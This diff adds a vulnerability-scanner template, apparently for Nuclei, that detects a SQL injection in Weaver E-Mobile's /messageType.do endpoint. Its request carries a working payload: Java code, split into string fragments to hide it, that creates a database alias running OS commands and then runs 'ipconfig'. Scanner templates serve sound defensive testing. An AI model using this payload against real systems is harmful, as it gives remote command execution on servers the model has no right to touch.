@@ -1,0 +1,43 @@
+id: e-mobile-messagetype-sqli
+
+info:
+  name: Weaver E-Mobile V6 SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    This template detects a SQL injection vulnerability in Weaver E-Mobile versions 4.0 to 6.6. The vulnerability allows remote attackers to execute arbitrary SQL commands via the 'typeName' parameter in a POST request to '/messageType.do'.
+    可通过reference 2的poc进行RCE
+  reference:
+    - https://github.com/YinWC/2021hvv_vul/blob/master/0412/%E6%B3%9B%E5%BE%AEOA%20%20e-mobile4.0-6.6%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-MobileServer%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: 泛微-EMobile
+
+http:
+  - raw:
+      - |
+        POST /messageType.do HTTP/1.1
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 1090
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="method"
+
+        create
+        --00content0boundary00
+        Content-Disposition: form-data; name="typeName"
+
+        1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('ipconfig');--
+        --00content0boundary00--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "推送类型已存在"
+          - "Windows IP"
